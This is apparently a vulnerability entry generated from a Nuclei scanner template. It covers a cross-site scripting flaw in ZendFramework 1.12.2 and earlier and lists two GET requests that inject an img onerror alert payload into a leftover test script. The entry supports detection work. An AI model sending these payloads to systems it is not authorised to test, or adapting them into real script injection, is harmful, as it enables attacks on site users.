# Vulnerability: ZendFramework 1.12.2 - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`zend-v1-xss.yaml`)

## Description
ZendFramework of versions <=1.12.2 contain a cross-site scripting vulnerability via an arbitrarily supplied parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/vendor/diablomedia/zendframework1-http/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(1)>
GET {{BaseURL}}/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(document.domain)>
```

